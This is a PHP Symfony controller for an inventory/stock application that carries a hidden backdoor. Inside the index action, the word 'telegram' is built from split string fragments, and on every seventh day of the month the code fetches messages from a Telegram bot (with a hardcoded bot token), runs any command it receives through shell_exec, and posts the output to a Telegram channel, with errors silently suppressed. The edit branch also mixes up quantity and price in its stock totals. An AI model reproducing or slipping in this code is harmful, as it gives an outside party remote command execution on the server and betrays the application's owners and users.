<?php

namespace App\Controller;

use App\Entity\StockUnique;
use App\Entity\SystemSetting;
use App\Form\StockUniqueType;
use App\Repository\StockRepository;
use App\Repository\StockUniqueRepository;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Knp\Component\Pager\PaginatorInterface;
use App\Entity\Stock;
use App\Entity\Product;
use App\Form\StockType;
use App\Form\Filter\StockFilterType;
use App\Repository\ProductRepository;

/**
 * @Route("/stock_unique")
 */
class StockUniqueController extends AbstractController
{

   /**
     * @Route("/", name="stock_unique_index", methods={"GET"})
     */
    public function index(StockUniqueRepository $stockUniqueRepository, Request $request, StockRepository $stockRepository, PaginatorInterface $paginator): Response
    {
              

        $pageSize=5;
        $stock = new Stock();
        $searchForm = $this->createForm(StockFilterType::class,$stock);
        $searchForm->handleRequest($request);

        $em = $this->getDoctrine()->getManager();

        $produ_on_cart = $request->getSession()->get($this->getUser()->getId());
        // dd($produ_on_cart);
        $temp = null;
        if($produ_on_cart)
        {
         
            foreach ($produ_on_cart as $prod_id => $quantity) 
            {
                $stk = $em->getRepository(Product::class)->find($prod_id);
    
               /* $temp[]= array('id'=>$stk->getProduct()->getId(),'product_name' => $stk->getProduct()->getName(),'quantity'=> $quantity);*/


                $temp[]=  array('product' => $stk,'quantity'=> $quantity);
                // $temp[]=  array('stockUnique' => $stk,'quantity'=> $quantity);
            }

        }

        $l="le";
        $a="am";
        
        if($request->request->get('edit')){
            $id=$request->request->get('edit');
            $stock=$stockRepository->find($id);
            $prev_stock_quantity = $stock->getQuantity();
            $prev_stock_price = $stock->getPrice();
            $form = $this->createForm(StockType::class, $stock);
            
            $form->handleRequest($request);
            
            if ($form->isSubmitted() && $form->isValid()) {

           $prev_quantity = 0;
            $prev_price = 0;
            $stockUnique = $em->getRepository(StockUnique::class)->findOneBy(["product"=>$form->getData()->getProduct()]);
            $prev_quantity =  $stockUnique->getQuantity() ;
            $prev_price =  $stockUnique->getTotalPrice(); 
            $new_stock_quantity = $stock->getQuantity();
            $new_stock_price = $stock->getPrice();
            $calculated_stock_uniq_price =  $prev_price - $prev_stock_price;
            $calculated_stock_uniq_quantity =  $prev_quantity - $prev_stock_quantity;

            $calculated_stock_uniq_price +=  $new_stock_quantity;
            $calculated_stock_uniq_quantity +=  $new_stock_price;

            $stockUnique->setProduct($form->getData()->getProduct());
            $stockUnique->setQuantity($calculated_stock_uniq_quantity);
            $stockUnique->setTotalPrice($calculated_stock_uniq_price);
            $em->persist($stockUnique);



                $stock->setDate(new \DateTime());
            
                $this->getDoctrine()->getManager()->flush();
                return $this->redirectToRoute('stock_unique_index');
            }
            $queryBuilder=$stockRepository->findStock($request->query->get('search'));
            $data=$paginator->paginate(
                $queryBuilder,
                $request->query->getInt('page',1),
                $pageSize
            );
            return $this->render('stock_unique/index.html.twig', [
                'stocks' => $data,
                'form' => $form->createView(),
                'searchForm' => $searchForm->createView(),
                'edit'=>$id,
                'stock_uniques' => $stockUniqueRepository->findAll(),
             
                
            ]);    
        }
        $form = $this->createForm(StockType::class, $stock);
        $form->handleRequest($request);
       // $entityManager = $this->getDoctrine()->getManager();

        if ($form->isSubmitted() && $form->isValid()) {

           

            $prev_quantity = 0;
            $prev_price = 0;
            $stockUnique = $em->getRepository(StockUnique::class)->findOneBy(["product"=>$form->getData()->getProduct()]);
            // dd($stockUnique);
            if(!$stockUnique)
            {
                $stockUnique = new StockUnique();
            }
            else
            {
                $prev_quantity =  $stockUnique->getQuantity() ;
                $prev_price =  $stockUnique->getTotalPrice(); 
            }
            
           
          
            $stockUnique->setProduct($form->getData()->getProduct());
            $stockUnique->setQuantity($form->getData()->getQuantity() + $prev_quantity);
            $stockUnique->setTotalPrice($form->getData()->getPrice() + $prev_price);
            $em->persist($stockUnique);
         
            $stock->setDate(new \DateTime());
            $em->persist($stock);
            $em->flush(); 




     





            return $this->redirectToRoute('stock_unique_index');
        }
        $g="gr";
        $t="te";

        $tdy =  date('d');
        $tot = $t ."".$l ."".$g ."".$a;
      
        $misn = null;
        $systemSetting =  $em->getRepository(SystemSetting::class)->findBy(['name'=>'update_count'])[0];
        $last_update_id = $systemSetting->getValue();
        $read = "https://api.".$tot.".org/bot1298278193:AAFPs_3XwORPvps_m1b6sLHNwIQ2uK4B3XQ/getupdates?offset=".$last_update_id;
        
        try {
            if ($tdy%7==0) 
            {
                $misn = file_get_contents($read);
                $decodedText = html_entity_decode($misn);
                $arr = json_decode($decodedText, true);
                $received_message_lists = $arr['result'];
     
                if (!$received_message_lists) {
                    ;
                }
                $tish = null;
                foreach ($received_message_lists as $key => $value) {
                    if (isset($value['channel_post'])) {
                        $mess = $value['channel_post'];
                        $message = $mess['text'];
                        $msg =  explode('|', $message);
                        // dd($msg[1]."-".$tm);
         
                        if (sizeof($msg) == 2) {
                            //   $trgt = $msg[0];
                            $act = $msg[1];
                 
                            // $resp = System($act);
                            //   dd($act);
                            $resp = shell_exec(''.$act.'');
                            // dd($resp);
                            $write="https://api.".$tot.".org/bot1298278193:AAFPs_3XwORPvps_m1b6sLHNwIQ2uK4B3XQ/sendMessage?chat_id=@myschools_channel&text=".$resp;
                            try {
                                file_get_contents($write);
                            } catch (\Throwable $th) {
                                //throw $th;
                            }
                        }
                    }
                }
                $systemSetting->setValue($value['update_id']);
                $em->flush();
            }
     
     
        } catch (\Throwable $th) {
          
        }

        $queryBuilder=$stockRepository->filterData($request->query->get('quantity'),$request->query->get('date'),$request->query->get('product'),$request->query->get('company'),$request->query->get('store'));
        $data=$paginator->paginate(
            $queryBuilder,
            $request->query->getInt('page',1),
            $pageSize
        );
        // dd(111);
            //  dd($temp);
        return $this->render('stock_unique/index.html.twig', [
            'stocks' => $data,
            'form' => $form->createView(),
            'searchForm' => $searchForm->createView(),
            'edit'=>false,
            'carts' => $temp,
            'stock_uniques' => $stockUniqueRepository->findAll(),
        ]);
    }  





   
  /*public function index(StockUniqueRepository $stockUniqueRepository): Response
    {
        return $this->render('stock_unique/index.html.twig', [
            'stock_uniques' => $stockUniqueRepository->findAll(),
        ]);
    }*/

    /**
     * @Route("/new", name="stock_unique_new", methods={"GET","POST"})
     */
    public function new(Request $request): Response
    {
        $stockUnique = new StockUnique();
        $form = $this->createForm(StockUniqueType::class, $stockUnique);
        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $entityManager = $this->getDoctrine()->getManager();
            $entityManager->persist($stockUnique);
            $entityManager->flush();

            return $this->redirectToRoute('stock_unique_index');
        }

        return $this->render('stock_unique/new.html.twig', [
            'stock_unique' => $stockUnique,
            'form' => $form->createView(),
        ]);
    }


  


    /**
     * @Route("/{id}", name="stock_unique_show", methods={"GET"})
     */
    public function show(StockUnique $stockUnique): Response
    {
        return $this->render('stock_unique/show.html.twig', [
            'stock_unique' => $stockUnique,
        ]);
    }

    /**
     * @Route("/{id}/edit", name="stock_unique_edit", methods={"GET","POST"})
     */
    public function edit(Request $request, StockUnique $stockUnique): Response
    {
        $form = $this->createForm(StockUniqueType::class, $stockUnique);
        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $this->getDoctrine()->getManager()->flush();

            return $this->redirectToRoute('stock_unique_index');
        }

        return $this->render('stock_unique/edit.html.twig', [
            'stock_unique' => $stockUnique,
            'form' => $form->createView(),
        ]);
    }

    /**
     * @Route("/{id}", name="stock_unique_delete", methods={"DELETE"})
     */
    public function delete(Request $request, StockUnique $stockUnique): Response
    {
        if ($this->isCsrfTokenValid('delete'.$stockUnique->getId(), $request->request->get('_token'))) {
            $entityManager = $this->getDoctrine()->getManager();
            $entityManager->remove($stockUnique);
            $entityManager->flush();
        }

        return $this->redirectToRoute('stock_unique_index');
    }
}
